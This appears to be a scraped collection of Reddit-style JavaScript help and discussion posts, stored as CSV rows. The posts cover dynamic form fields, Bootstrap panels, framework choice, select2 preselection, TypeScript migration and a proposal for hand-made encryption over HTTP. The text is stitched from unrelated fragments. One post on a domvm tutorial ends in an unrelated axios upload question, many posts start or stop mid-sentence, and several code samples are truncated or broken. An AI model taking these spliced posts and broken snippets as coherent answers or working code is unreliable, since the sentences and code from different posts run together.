The field below is being loaded dynamically, more than once.

**JAVASCRIPT**:

I can make the script below load twice, or once. If I load it once, then it only works for the first field. If I load it twice, then it only works for the second field. 

    &lt;script type=""text/javascript""&gt;
    	var onix = false;
    	function onOffButton(id, text) {

    		var select_id = $(""#addfield"").prevAll('select').attr(""idx"");

    		if (onix == false) {
    			document.getElementById(id).style.display = 'block';
    			document.getElementById(text).style.display = 'block';
    			document.getElementById(""addnew"").textContent=""[Close] Add New"";

    		} else if (onix == true) {
    			document.getElementById(id).style.display = 'none';

    			onix = false;                
    		}
    	}
    &lt;/script&gt;


**SUMMARY**

I need to know which element the section addfield belongs to. Most importantly, the form-&gt;entity. The goal is to generate a GET link like so: `localhost/$form-&gt;entity/create/[value-of-newstuff]`

**I tried** setting an array on an external file. And that does work, but I don't know what to do with it.

**I also tried** using `&lt;?php echo rand(); ?&gt;` on all of the attributes. The results were as expected, when javascript loads once it only works for the first field, loads twice, only works for the second field.

How can I overcome this obstacle?",Javascript &amp; Html loads twice (form field) how can I know which element it belongs to?
1,2016-12-31 23:32:51,3,3,"I am working with panels in Bootstrap. Trying to add a nested div and nest it within a div dynamically. I want to be able to click a button and have the modified div be appended to the already nested div. In this case, there is a column with a panel, and a panel-body with some text that is being added to a row within a container-fluid. Using Google Chrome Version 55.0.2883.87 m (at time of post, is latest version).  


HTML:

    &lt;div class=""container-fluid""&gt;
                          &lt;div id=""row"" class=""row""&gt; &lt;button class=""btn btn-default"" onclick=""createPanel()""&gt;Add a panel&lt;/button&gt;
                               

                          &lt;/div&gt;
    &lt;/div&gt;


Javascript:

    function createPanel() {

      var column = document.createElement(""DIV"");
      var panel = document.createElement(""DIV"");
      var panel-body = document.createElement(""DIV"");

      var column = document.createElement(""DIV"");

      panel-body.className = ""panel-body"";
      panel-body.innerHTML = ""It works!"";
      panel.appendChild(panel-body);
      }



The newly created nested div won't seem to add to the already existing nested div.

How can I overcome this obstacle?



UPDATE: My problem was that I had attempted to create a variable ""panel-body"", whereas in the code, it is read as panel - body (subtraction of one variable from another/ the difference of panel and body). Here is my new working version of the javascript.


Javascript:

    function createPanel() {

      var column = document.createElement(""DIV"");
      column.className = ""col-xs-12 col-sm-12 col-md-12 col-lg-12"";
      (document.getElementById('row')).appendChild(column);

      var panel = document.createElement(""DIV"");
      panel.className = ""panel panel-default"";
      column.appendChild(panel);

      var panelBody = document.createElement(""DIV"");
      panelBody.className = ""panel-body"";
      panelBody.innerHTML = ""It works!"";
      panel.appendChild(panelBody);
      }


Not necessarily to important, but I realized that I created the ""column"", ""panel"", and ""panel-body"" variables twice. I was originally planning on eliminating most of this code and appending every child in one line of code.

14,2017-01-04 23:34:06,1,2,"I'm not a front-end developer, I would pride myself on understanding javaScript as well as the next guy but my interaction with front ends is generally speaking ""I have this idea for an app, people won't install it on their computer, so let me crop up most of the logic on a server and design a front-end"".

However, my ideas for apps/websties are sometimes a bit strange in terms of the implementation they require and I often find myself facing a lot of problems with ""the stack"" that I currently use (which is React, Redux, redux-thunk, react-redux and React Router). I like ""the theory"" behind these technologies but I feel like once I start trying to make anything half innovative (e.g.: integrate with websocket, implement some funky way to request data from server to stay up to date, try rendering a lot of interactive stuff on a canvas ... etc).

I've noticed that implementing projects in pure javascript vs implementing them in a full-fledged framework often ends up being quicker in terms of man-hours I spend coding&amp;testing and since I never really need to ""scale"" my projects or extend them too much or hand them over to another person, I can glance over some questionable practices since they ""just work"" most of the time.

Still, I feel like some sort of framework or library might ease my life a lot, but I can't for the life of me figure out which one to use, they all seem to be so inter-mingled that its really impossible to use one without the other. I mean, sure React ""in theory"" works without redux or flux, but in practice it results in very unwieldy code and I feel like the same goes for something like redux when used ""stand alone"". One library I've been thinking about using is immutable.js, since 99% of the time I send up treating data as immutable for the sake of my sanity and my time spent debugging testing.

I'm the kind of guy who's really up for learning new and crazy stuff, if a huge library like Akka tells me ""Hey, it might take a bit to learn, but there's a huge fucking pay off at the end"", I might actually trust it and start developing with it an loving it. However most javascript libraries I've meet seem to get hung up on syntax, having various restrictive models for no purpose other than convention and don't tackle any of the ""real issues"" I often come against, which is stuff around the lines of:
-&gt; Server side routing that's 100% reliable and fast
-&gt; Easier syntax for various wanky ways of getting data from the server(e.g. via long polling or web socket)
-&gt; Making code run faster than vanilla javascript
-&gt; Making the interface still usable without connection to the server
-&gt; Making debugging &amp; testing easier 

Until now the only libraries I've found to tackle these issues are logerr and offline.js.

At this point I've fallen back on vanilla javascript using all the nice ES7 syntax (generators, asyn await, template strings... etc). But I feel like I'm missing out on a lot of stuff, are there any other people out there that work on small-medium sized projects alone and don't have 8h/day to spend on ""front end stuff"" ? Do you have a prefered stack or some libraries you find are nice to have around in certain scenarios ? ",Do you guys have a stack for applications/websites limited in scope ?
15,2017-01-05 15:33:48,7,11,"Hi peeps,

Thought it'd be fun to implement React's tutorial using domvm (disclaimer: i'm the lib author). This implementation works identically to the React version, however it's not meant to be a 1:1 rewrite, cause what would be the fun in that? It improves (IMHO) on the original in a few ways:

- It's not UI-centric; the view layer is loosely coupled to a POJS game model, so...
- You can use both the UI and API to play the game.
- The whole thing is pure javascript. No npm, dependencies, IDE, special dev-tools or compilation required.
- Loading performance metrics from Chrome's DevTools &amp; Task Manager:

               | React    | domvm
:--------------|---------:|---------:
Transferred    |  52.4 KB |   8.2 KB
DOMContentLoad |   235 ms |   135 ms
Scripting      |  60.0 ms |   5.6 ms
JS Memory      | 3,155 KB | 1,498 KB

This is on a decent laptop, a fast internet connection and latest Chrome, so the differences may seem inconsequential but on my phone that's 5 years old and crappy 3G connection the performance difference is literally night and day in Android Chrome:

DOMContentLoad: 1350ms vs 550ms

Scripting: 540ms vs 60ms

The gap is likely even greater in stock Android 4.4.4 browser which uses a Chromium 33 rendering engine.

My question is if anyone knows how I can solve this issue. I have tried to change the content-type all kinds of different ways, which amounted to nothing. I also tried to change the the file as well to see if there was another way to send it to the server, which also amounted to nothing.

I also did notice that on axios' github, there are a lot of threads related to changing the content-type, but none of the possible answers helped me, and they also mostly seem unsolved.

So anyone know what I can do to upload the files?

20,2017-01-06 21:31:27,6,7,"Hi all,

I wrote the API client for the platform I've been building, [Cycle](https://cycle.io) in Typescript. I've been a huge fan of the language since v1.4, and have implemented some of the latest features of 2.1.4 into this release (Partials) with more to come. 

https://github.com/cycleplatform/api-client-nodejs

I'd like to get the community's thoughts on the way I do error handling here. I've been thinking about writing a blog about it. 
Anyway, instead of using exceptions everywhere, the only time I use exceptions are if there is a configuration error (no token loaded when trying to make a request, etc). For the API responses themselves, I use a tagged union interface with 3 values: ok, error, and value.

What I like about this method is, in order to check the value/error, you first MUST check the value of ok. If it is true, then the logic flow will conclude it must be a success interface and therefore will have a value. If it's not, it will determine it to be an error interface and the error value then becomes available to check.

I have a lot of issues with using exceptions, although I understand why javascript has them and why they can be useful assuming this kind of type safety isn't available. But I think with this approach you are able to get the best of both worlds: Forcing devs to handling logic flow in the case of an error (like exceptions enforce...unless you ignore them and your program crashes from some mysterious place), and the inline readability of error codes (which are bad if you aren't forced to check the return value).

I was inspired heavily by golang's methodologies, as I've been working with that a lot as well over the last couple years. Would be great to hear what the TS community's thoughts are. May not be applicable for non-library things, but I think it's a good fit here.



P.S. If you would like to try out the platform/library, here's a code for $50 in credits to use it (Disclaimer, I'm the CTO...but if you're doing work with docker it's a great solution to deploying your typescript webapps!): [M25JBA](https://portal.cycle.io/signup?code=M25JBA) -- the portal is also written in typescript :)",API Client written in Typescript

You can not say at first look what this file is used for..

I do not understand how can framework help me, when it seems to me that almost everything I try to achieve in framework can be simply done in jquerry with few lines of code , like calling rest service with Ajax and then outputting result...

Using React to fill virtual DOM and send some actions (you have to define almost everything and how much time this will take you...)  is more complicated, needs probably more code and even after few weeks trying to understand how this is going to help me.. I was not able...

I still did not manage to understand any advantages of these frameworks. Why do you even want to use some pattern like MVC or any other at frontend and make frontend more complicated then it could be??

I've been using c# for almost two years now, really love the language and getting used to the whole .Net framework.

I was told by colleagues that C# will never be ""at level"" with Java for the simple reason Java can run on Linux too.

I know there's the mono project to use C# on Linux though, and I've understood that you can use monodevelop as IDE.
However, I've been on pluralsight and only found courses related to Unity when searching for monodevelop.
I've looked a bit here on reddit but only found people complaining the monodevelop version provided with Unity is outdated.

I don't want to learn to code for Unity only (I've tried it, it's neat but I don't plan to make career in videogames), so I was wondering if anyone has resources or hints for me to learn to work with monoDevelop ? (Or reasons I should NOT use it and instead use vsCode or notepad or whatever is the perfect solution I never heard of).

Or should I even avoid to use c#/.net on linux and switch to something else? I'm a junior and I'm learning python in my spare time, I know a bit of javascript but I don't feel like these languages can be used for the same reasons (even if Node is quite powerful, even if Python looks like the holy graal of coding, it just doesnt' feel the same).

My question is more a which framework should I choose, or should I even use one, or which one would you choose?

My background/project history:

I'm very good at html, css and jquery, but never really looked into mvc frameworks such as ember, angular or react. I know of the mvc concept, and I've also researched a lot over the past few weeks and I do understand the basic principle behind it, but as I said never really jumped into it.

Now I've wrote a simple single web-app which is basically polling a backend via AJAX and reacting to it. For example I request information like username, status of the backend and I render certain pages( login,overview of the app, detailview,...) depending on what status the backend returns.

This project is suprisingly running very well, but I'm not very happy with the way it has turned out. For example I do have multiple AJAX polling via setTimeout, memory leaks due to event listeners being active even if they element is not present at the moment,... .

It's just spaghetti code jquery wise and even the css and html is not as I think it has to be to be up to date.

So now I do want to refactor the whole thing and bring it into the year 2017 or at least 2015.

I've looked into angular,ember and react and somehow every framework has there benefits but also disadvantages.

My goals:

What I would like to do is, use some way of templating my html files, using less for css and somehow modularize(is it even a word?) my whole javascript.

So my question would be, have you worked with any of those frameworks and can you somehow identify some projects you did in the past that would be comparable to mine?

Also I'm kind of getting the grip of grunt and other build tools, so any suggestions to articles etc would be also appreciated :-)",mv*? which framework would you choose?

Also, some get complicated with conditional logic and such. I know this can be done with javascript, but I have found that to get messy with big/complicated forms.

Finally, with our wishlist, we would like an HR employee application form. This would handle the uploading of documents (something we don't offer now with either our ticket system or forms).

I am thinking some sort of Form Software can handle all of this. Our team only has 1.5 programmers but we are definitely able to integrate and modify code if needed (for something open source).  

Does anyone have any suggestions for a catch-all software, or should have have 2 or 3 separate pieces of software to handle this.

One option is to rebuild but due to time and lack of resources that is our last resort. 

Also, we are using the LAMP stack and our current version of PHP is 7. We are not using a preexisting framework (no laravel or anything) but we are using MVC. 

Appreciate the help!",Looking for Suggestions on Form Software

I'm using a ViewBag with the multiselect list to pass the list of albums. I'm thinking in order to achieve what I want I must either have to put in some sort of other parameter in the viewbag that I'm passing to the edit page? or something with the javascript/jquery that I have to edit in order to already have the selected values inserted into the textbox?

118,2017-01-30 15:09:50,1,1,"I have a web app with a very large codebase (63 files ~70k lines of code) that is nearing its 10th year anniversary. Because I'm a masochist, or what I like to say to myself, because I like a good challenge I want to bring this codebase forward into the 21th century.

Not only was it written 10 years ago, the foundation of the codebase which is a good chunk was written by people that didn't know the inner workings of JS so some stuff is lets say questionable, but since it does what it is supposed to do we don't interfere with it.

But most importantly there are NO tests, no unit tests at least to verify the code, everything is attached to 1 big object which in turn makes it hard to even add unit tests, but hey it was 10 years ago.

So the main object looks like this:
**root.js**

    RootPage = function() {
        this.member1 = 'a';
        this.member2 = 'b';
    };
    
    RootPage.prototype = {
        member3: 'c',
        member4: null,
        method1: function() {
        },
        method2: function() {
        }
    };

then in the **index.html** file, straight forward :

    &lt;script type=""text/javascript""&gt;
        var Root = new RootPage();
        
        Root.anothermember = null;
        // ..and so on
    &lt;/script&gt;

However further down in that script tag it calls nested stuff like:
`Root.Calculate.init();`

Where the **Calculate** namespace is defined like this in **calculate.js** :

    RootPage.prototype.Calculate = (function () {
    
        var init = function() {
            foo();
        };
    
        var foo = function() {
            Root.NS1.myFunction();
            Root.NS2.myFunction();
        };
    
        return {
            init: init
        }
    
    })();

At least here I know which functions are exposed and which aren't but the problem is that this **Calculate** namespace can contain calls to `Root.NS1.myFunction()` and `Root.NS2.myFunction()` which live in their own respective js files, namely **ns1.js** and **ns2.js**

The namespace doesn't go deeper than 1, so at least there's that.

And this is where I'm stuck. I don't know how to merge **NS1** and **NS2** to the RootPage object so it is available in the **Calculate** module.

Of course I could do this:

            import {NS1} from './ns1';
            import {NS2} from './ns2';
            
            export module Calculate {
                export function init() {
                    foo();
                }
                function foo() {
                    NS1.myFunction();
                    NS2.myFunction();        
                }
            }

But as said there are NO unit tests so I would rather only make the most minimal changes required to satisfy the TypeScript compiler before I even take on bigger code changes. Also keep in mind there are 63 files with 70k loc and pratically every file needs to be touched.

Additionally there are also (dozens) of html files which may reference a function directly like `href=""javascript:Root.loadNews()""` so I don't really want to change the naming.

Also there are files **myFile.js** and **myFile2.js** which add directly to the same Root object.

this kludge was great during devel, but the release process was prone to errors, eg forgetting to switch the links to the war. this approach is also server dependent, ie i modified catalina_home/webapps directly. switching to jetty would have required a different kludge. edit: as /u/t90fan suggests, the actual deployment would likely be split, similar to the dev setup

but for some reason when I do that, it doesn't work. It only preselects the License for value 2 and I do have a License with an id of 4.

Here is my whole select2 method 

    &lt;script type=""text/javascript""&gt;
        
        var lets = @Html.Raw(ViewBag.selectedLicenses);
        console.log(lets);

                    width: 280
               
                }).select2('val', [2,4]);
            });
        
    &lt;/script&gt;

and the edit method in my controller

    public ActionResult Edit(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            Asset asset = db.Assets.Find(id);
            if (asset == null)
            {
                return HttpNotFound();
            }

            var selected = asset.Licenses.ToArray();
            string selectedLicenses = JsonConvert.SerializeObject(selected);
            ViewBag.selectedLicenses = selectedLicenses;   

            ViewBag.Licenses = new MultiSelectList(db.Licenses, ""LicenseID"", ""LicenseName""/*, asset.LicenseID*/);
            ViewBag.ManufacturerID = new SelectList(db.Manufacturers.OrderBy(m =&gt; m.Company), ""ManufacturerID"", ""Company"", asset.ManufacturerID);
            ViewBag.PersonID = new SelectList(db.People.OrderBy(m =&gt; m.Name), ""PersonID"", ""Name"", asset.PersonID);
            ViewBag.AssetTypeID = new SelectList(db.AssetTypes, ""AssetTypeID"", ""Category"");
            ViewBag.RegionID = new SelectList(db.Regions, ""RegionID"", ""Location"", asset.RegionID);
            ViewBag.StatusID = new SelectList(db.Status, ""StatusID"", ""Condition"", asset.StatusID);
            return View(asset);
        }

so right now I'm trying to figure the mystery of why I can't have two values in my array and then if I can figure that out, I'm trying to turn the collection I have in the edit method into a readable array by javascript. When I do some javascript debugging and did a console.log on the selectedLicenses, these were the contents http://imgur.com/a/lMVAz. and then I tried mapping which gave me to something closer I believe, with just the id of the license but when I tried putting that in as such

    }).select2('val', allLicenses);

it didn't work either.

**EDIT** well I feel stupid, the reason why if I put [2,4] and only the license for id 2 showed up is because that asset ONLY had that license associated it with it lol. but now this just leaves the part of how I can correctly configure a collection to an array so I can pass that in as opposed to [2,4] it will be a int array variable with the stored values of the licenseID's I guess

**EDIT 2** WOW I actually finally got it to work, I changed it up and used initSelection: which I did try originally using but it wasn't working out and every solution I looked for had ajax in it as well, but now I figured it out using my own way and it's a lot simpler. 

BUT my final one problem is, so the preselected values load on page load successfully, but now the problem is, when I go to add a new license, it clears all the preselected values and after looking at it I noticed that if a license was selected, the license is colored grey in the dropdownlist meaning its been selected already. So I need to find out how I can basically say to mark the ones preselected as selected in the dropdownlist, any ideas as to how I can achieve this? Here is the new updated code:

    &lt;script type=""text/javascript""&gt;
        
        var lets = @Html.Raw(ViewBag.selectedLicenses);
        var chosenLicenses = lets.map(function(license){
            return {id: license.LicenseID, text: license.LicenseName}
        });

        
            $(document).ready(function() {
                $('#Licenses').select2({
                    placeholder: ""Select license(s)"",

                    width: 280,

                        callback(chosenLicenses);

I think my head is going to explode with the amount of new, scary things that I used today just to make the first test run. Then I spent about an hour reasearching how to make jQuery elements work within Mocha.  Now I got the first test to work, and am all excited to write the rest for the whole project. 

But when I reloaded my page, I got nothing. Well, not really nothing since it came with a little console error saying `module` (from `bar.js`) and `require` (from `main.js`) is not defined.  Basically, my setup looks like this:

    // main.js
    const bar = require(""./bar"");
    $(document).ready( () =&gt; {
        const app = new module.Foo(bar);
        app.start();
    })

    module.exports = {
        Foo : class Foo {
            start(){
                // ...
            }

            someMethod(){

    }

I think it's because `require` and `module.exports` are exclusive to `node.js`, right?

**[GitHub](https://github.com/skyfoxdesign/Fancy-Buttons)**

This is my first plugin, and I hope it works for people! I essentially had the idea to borrow some of the interactivity that Windows tiles have, but replicated for use on the web and I've come up with *Fancy Buttons*.

There are two variants - one for traditional buttons (where the interaction only begins on click), and another for items that you want to be immediately interactive on hover. Hover is default, for standard button effect, switch '*true*' for '*false*' at the start of the .js file.

It didn't take me too long to make the basic 3D effect - what was hardest was figuring out how to make it respond like something real; like it had a sprung ball joint underneath. Hopefully you guys will get what I mean if you try it!

The next hardest thing was to successfully animate a custom quasi-shader so that a light source was emulated. This required a fair bit of math and was not easy! Calculating the current touch location from the center and inverting it to apply a transparent gradient sounds easy, but figuring out a reliable calc was tricky - especially for a novice like myself.

Finally, there was making it work with touch input The big problem here was solving the way that touch events bind to the initial element selected, and how they don't like to switch elements easily.

Still, I think I solved that and my tests seem to work.

**My Problem:** I have a dynamic table on my webpage (WPDataTables) that includes a global search and then column specific search. My users can type into these searches and the content will dynamically update. My problem is the URL does not update to include search parameters so we cannot copy and send URL's to other people that include specific search results.

WpDataTables currently has the following keys to pre filter the table:

Global: ?wdt_search=filtervalue
Column: ?wdt_column_filter[ColumnName]=filtervalue
This is great but my users aren't savvy enough to create their own URL strings and there are a large number of possible filters so pre-creating each one is not an option.

**Currently:** I am close to getting a solution, I think, with the following:

    &lt;body&gt;
      &lt;button onclick=""updateURL();""&gt;Update&lt;/button&gt;
        &lt;script type=""text/javascript""&gt;

          }
         }

Ideally, with this the user will simply click the Update button to update the URL with the current search parameters. The problem is ?para=hello is just a hard coded parameter and I can't figure out how to get it to be dynamic and change with the users searching/filtering.

initially it works correctly, adding the scores to the the appropriate section

my issue is 1) i dont want the scores to keep adding every time i want to reroll the dice , i need it to start over also 2) i have it so that the dice do not change value if selected thus i do not want that score to change. I hope that makes sense.

I'm getting a reference error when trying to extend a class that is alphabetically less than the child class name.

That is, I have two files:

same_dir/A.js:

    class A extends B { ... }

same_dir/B.js:

    class B { ... }

I'm guessing my Rails server minifies the files in alphabetical order. So since they're in the same directory, we have a reference to B before it's defined.

What's the standard way of dealing with this kind of thing? It seems like it should be simple, but I've searched high and low and all I can find is ReferenceError-s for variables, 'this', functions, and other almost-correct-but just-off-things.

It seems ridiculous that I would have to ensure that all child classes are ordered alphabetically greater than their parents or else are placed in a sub folder further down your particular web-server's javascript processing hierarchy.

165,2017-02-11 02:00:11,20,25,"Hey all,

I'm learning javascript in conjuction with google sheets scripting to make spreadsheets to calculate stuff.

My current spreadsheet needs to parse HTML. Specifically, one of the tabs in my sheet will hold every item from a game and its corresponding stats. It gets this info from the web.

I've pushed hard and been able to figure most of it out, but there's one thing I just can't get.

This page that I""m getting the info from is not formatted the best for parsing. Here is a screen grab of the HTML

http://imgur.com/a/vOKLR

My method was:

I used getelementbyid('b') to split it up by each item. Then, i created a range between 2 adjacent &lt;b&gt; tags. In that range, I used queryselectorall('a') to split it up by a tags. This holds all the stats, like str, dex, vit etc. I've been able to parse all that.

The problem is when I get to an item like Marine F Gloves that is shown in that picture. I cannot for the life of me figure out how to get the +3 after the CHR&lt;/a&gt;.  The reason that's different than the other stats is because it is not in between two &lt;a&gt; tags. It's at the end, after the last &lt;a&gt; tag in the range.

I thought I could just get the text in the html from the &lt;/a&gt; to the next tag &lt;/td&gt; then parse the 3 out but I cant figure out how to do that.

I'm a Rails developer by day, but I'm working on deploying my first javascript app (that I boostrapped from the `create-react-app` project), working with an API I've built along side it. 

Until now, all of my ajax calls have had their URL hardcoded as 'http://localhost:3030', because that's all I needed locally. Now, I have a need for the API url to be configured somehow, depending on whether I'm running it locally, or whether it's the 'build' version running in production. 

What's the usual process for this? Is there a tool that everyone uses? Is there an easy way of saying ""Hey, here's a set a variables, please use this set locally, but when you build, use this set instead""?

I'm planning on building a simple management single page/progressive web app for small to medium sized car rental companies. Basically car, client database, contract template and generator, statistics etc.
While this is mostly going to be for a family member I'm planning on also releasing it for commercial purposes.
The backend will probably be powered by Lumen or some similar micro-service framework as it will only serve as an API.
However I can't seem to be able to choose on frontend framework

basically the dance off is between

* Angular 2
* React
* Vue.js

I've tried Vue a little bit and I really like it. It feels like the perfect middleground between angular and react. However I'm not sure if I want to heavily invest time to study framework that is mostly popular in Asia (my location is Central Europe)

I also like React because it's very close to javascript. Also React Native seems like a pretty cool technology. However while researching my options I came across a problem with licensing and react. For more infomartion  visit this [link on hackernews](https://news.ycombinator.com/item?id=11270213) . While I highly doubt that the impact of my app will get much farther than my small hometown. Still, the possibility of some legal issues with Facebook seems pretty daunting. I've already seen some posts from programmers who can't use react due to the legal department at their company, rendering their skills with react useless.

Angular 2 - I don't know much about angular, I mean I like the idea that it's a whole package and at the same time I don't.

What do you think is the best fit and what is the safest bet career wise. Thanks!

Anyway, over the last year or so I've been fairly independently developing a range of algorithms to do various data analytics on our database. It's nothing amazingly complicated but I'm doing it in python and making heavy use of numpy/scipy statistical functions and declustering in scikit-learn.

We have recently kicked off the development of a web-app that we're doing in node/angular. The lead developer is an experienced web developer, and he wants us to centralise our codebase to javascript, including the work I am doing on our data analytics.

My question is- is there anything intrinsically better about using either python or javascript for data analytics? I'm applying some very basic elements of ""machine learning"" (i.e. statistics and programming), but I don't see much precedent for doing similar work in javascript. I'm also much better at python. Has anybody else done heavy data crunching in node? Worked with wrapping python libraries in js? Is it a waste of time to try do something twice in two different languages?",Javascript or Python?

I have developed a small interactive interface using D3. The data is read from a separate JSON. What I'd like to do, is at the end of a 'session' be able to save to the JSON file information about the state of the interactive display. 

For example, say each element in the JSON file has a key value pair ""active"": true/false

Let's see the interaction of the user changes this state, and I want to 'remember' it for next session. 

Where should I start? Is this straightforward? What tools might I look into?

190,2017-02-16 19:34:40,9,1,"So before I get started, I've read [this article stating it's ""never possible""](https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2011/august/javascript-cryptography-considered-harmful/) but from what I can see, I still don't understand why.  

The article seems to focus on the idea that an ""attacker"" would be able to run your code in his or her own browser, or from their own site, wrapped in a DOM that has hooks to bypass the crypto in some way.  But this just isn't a realistic scenario when I'm creating the algorithm myself.  (If a ""hacker"" were to ""hack"" their own session, why would I care?)  

I'm also not interested in arguments as to why ""you should just use HTTPS"".  That is not the question.

My idea is that you could fairly easily implement an HTTPS-esque system by emulating what HTTPS does.  RSA encryption and decryption is fairly simple and straightforward, and writing an encryptor in Javascript would be easy enough.

So my idea is as follows: 

1.) On ""session start"" the client would ask for a public key from the server.   
2.) The server would respond with a public key and session ID.  
3.) The client would use a pseudo-random number generator (not the built in JS one as it's fairly bad) to generate a large random string for encryption from this point on.  
4.) The client would encrypt this string with the public key using RSA, and send the encrypted string to the server stating ""this will be our 'session string'"".  
5.) From that point on, all communication to the server will have the session ID in the headers, and all binary messages will be encrypted with the ""session string"".  

I am admittedly not strong with Javascript, but I'm fairly sure that unless a client is ALREADY compromised, this would allow for secure communication between the client and server on HTTP.  (Obviously, this requires trust on the part of the client, but that's not the point.)  

Thoughts?",Is it possible to create your own Crypto algorithm if you can't use HTTPS?

The problem asks to create a function that compresses a sentence (takes out the spaces and punctuation) and use previously created functions, such as the below functions ""isWhiteSpace"" and ""isPunct"" in the last ""compress"" function. This is what I have so far. 

//A.

function isWhiteSpace(chr){

	var whiteSpace = /\s/g;

	return whiteSpace.test(chr)

}

//B.

function isPunct(ch2){

	var punct = /[:;,.?!-""(){}]/g

	return punct.test(ch2)

}

//C.
 
function compress(snt){

	var ary = snt.split("""");

	for (var i = 0; i &lt; ary.length; i++){

		if(isWhiteSpace(ary[i])){

			ary.splice(i, 1)

		}else if(isPunct(ary[i])){

			ary.splice(i, 1)
		}

		var snt2 = ary.join();

	}

	return snt2

So if I input something like ""hello, world."" it returns as ""h,e,l,l,o, ,w,o,r,l,d"" so it at least gets rid of punctuation but I'm completely stuck.

234,2017-02-28 04:12:15,53,36,"Many if not all of you have used more than one language to write applications. Even with modern versions of Python and the improvements to it that have come with it thanks to multiprocessing, multithreading, async, more efficient underlying code, etc.., it's still generally touted as a language that is significantly slower in execution than languages. The saving grace of python as a langauge has, at least from my admittedly limited real world exposure to it, been that the speed and ease at which developers are able to build software with it more than justifies the performance. 



So my question for discussion here: Have you ever been working in a job where you or your team decided against using python because of it's performance? On a similar vein, have you ever been on a project or team that chose python in spite of it's performance due to the ease of developing and maintaining python code instead of another language? 


EDIT: To get things started: My current place of employment is about 90% pure Java developers who know enough of javascript to build out front ends but are otherwise purely java developers. We have a number of ""batch jobs"" written in python. These jobs are mostly smaller jobs, that run at certain time intervals. Mainly either moving data to/from different data sources or sending out automated emails for customer support. 



Python was chosen as the initial and current implementation for a number of jobs that were to be run as cron jobs directly on our database servers because of the speed of developing smaller programs in Python vs Java, where we didn't want or need to build out a big Java package or deal with the verbosity of Java code and maven dependency files. Also, the main implementers of these batch jobs didn't want to have to compile and do maven builds on a Java project every time there was a change to the jobs even if it was automated from CI. They wanted to just verify the syntax was fine and drop the Python scripts on the server(obviously tested well in development environments before being ran in production). Also, since the development time for these jobs to get done on time were more crucial than saving the time difference that a ""faster"" language may have had during execution, Python was the obvious tool for the job. 


While it's fairly easy to develop and maintain these Python applications for myself and the handful of other developers who are familiar enough with Python , the major downside is that a large majority of the developers aren't very fluent with Python . This means if none of the guys familiar with Python have time to do necessary code changes to these jobs, it takes other developers extra time to make fairly small changes because they have to do more reference research about python syntax and functions that they aren't familiar with(though the relative simplicity of Python gets a shout out here, since even a guy who only devs in Java can reasonably pick up enough Python to make small changes on these applications). Obviously, this is not necessarily unique to the fact we chose Python, since any language that was unfamiliar to most of the developers in the shop would introduce the same issues. However, it was one problem that did come up in our environment of primarily Java developers. This also means the willingness of devs to go back and make improvements and improve unit/automation test coverage for these jobs is not very high.

245,2017-03-03 08:54:08,13,1,"Hi folks

My question isn't about Javascript per se but about a concept my team and I would like to implement.
We're currently working a lot with Vue.js and we love it for it's simplicity but we're somehow stuck:

We would like to build a set of input field components. These components can then be used together with other components to create a basic form (goal is to let designers build javascript widgets).

The problem we're currently facing is the frontend validation. We're currently using [vee-validate](https://github.com/logaretm/vee-validate) but I think we're missing something important ...

Here's a short example of what we have so far:

&gt; This is one of many input fields. This component represent the ""firstname"" field.


    // firstname.vue
    &lt;template&gt;
        &lt;div&gt;
            &lt;input
                type=""text""
                v-validate
                data-vv-rules=""required""
                data-vv-name=""firstname""
                data-vv-as=""firstname""
                data-vv-value-path=""firstname""

                v-bind:value=""value""
                v-on:input=""updateValue($event.target.value)""

                placeholder=""Enter your firstname""
            &gt;
            &lt;span v-show=""this.errors.has('firstname')""&gt;
                {{ this.errors.first('firstname') }}
            &lt;/span&gt;
        &lt;/div&gt;
    &lt;/template&gt;


&gt; This is the parent component. Together with other components this will create the form the user is seeing.


    // form.vue
    &lt;template&gt;
        &lt;firstname&gt;&lt;/firstname&gt;
        &lt;lastname&gt;&lt;/lastname&gt;
        &lt;submit-button&gt;&lt;/submit-button&gt;
    &lt;/template&gt;


When a user would click on the &lt;submit-button&gt; it should validate all given fields and display a corresponding validation error message near the field.

We created a rought prototype by following the [documentation](http://vee-validate.logaretm.com/examples#event-bus-example) and changing the code by adding a lot of overhead so it works with the latest BETA version (yeah, I know 🙃).
We also understand that the actual problem here are the scopes of a single Vue-Component (a component won't talk to another component if explictly fire an event).

**But isn't this a problem all these modern Frameworks / UI Libraries should be able to solve? Isn't this something all us developers want? Reusable components which solve 1 problem only?**

Or are we missing a key concept here? 
Has anyone here solved this problem with anther library?

The easiet way would be to discard the whole idea to use field components and just have a the form components where we have all our `div` and `input` fields.

PS: I tried to create a JSFiddle with a working demo, but the validation libary must be loaded by a module loader

require.js and commonjs appear to need me to use other libraries (node?) or refactor my javascript files and I'm hoping to avoid deviating from vanilla setups - plus not quite seeming to meet my need below.

I have a standard module pattern (function(){})(); which successfully kept all my code in a tidy scope - but then it got too big - I wanted to break out some of the functions and objects into separate js files to help me manage them. 

Unfortunately that brings them out of the primary file/module's scope and variables and functions which used to be 'private' and accessible to all now have to be passed back in explicitly - and it looks like that's how require etc. would work too - there doesn't seem to be an easy way to just say 'get js file A, execute it, and make its variables and functions etc. accessible to and be able to access js file B.

By using eval I've done it (essentially 'building' a big js file and eval it at once) and I've even managed some optimisation / reuse by storing the downloaded scripts in case anything else wants them either.

I'm actually happy with that except for one thing - debugging...now I have to debug my 'uber eval script' instead of tracking the various script files.

With web design projects, we use HTML slicing services. I design a website and then get people who can just convert it into HTML/CSS/javascript. This save me or my partner having to do this part of the development and my partner can focus on the backend programming.

With IOS I would love to hand my designs in Sketch to someone who can create the screens already with auto layout set. And maybe so other stuff that is more on the front end.

Do services like this exist? Is it even possible? Because we're new, we haven't found anything and do know how to go about splitting up a project into sections that could be sourced. My partner doesn't think what I'm asking is available because he says that he does both at the same time.

I learnt python to web scrape and automate websites. 
I know bs4 and selenium also dabbled in a few other libraries Pickle PIL mechanize requests urllib etc. Whipping up a selenium script and automating a site is as easy as  brushing my teeth. 
Though i know it's just child play.

I want to take this seriously. I searched on indeed and am at a loss as to what skills i need to land a job coding in Django.

How much of each should i really know though?
Say if i had 100 time tokens, how much of each should i place into the above?
5 in html, 5 in Css and 10 in Javascript? etc
What are some goals for each of the above? I should be able to do at the bare minimum X with Y language 

But for some reason every job listing i see there is always some far out random requirement(differs from reach posting) like  ""To apply to X company we require expertise in html/css and flippityfluefla ""  that i have never heard of. 
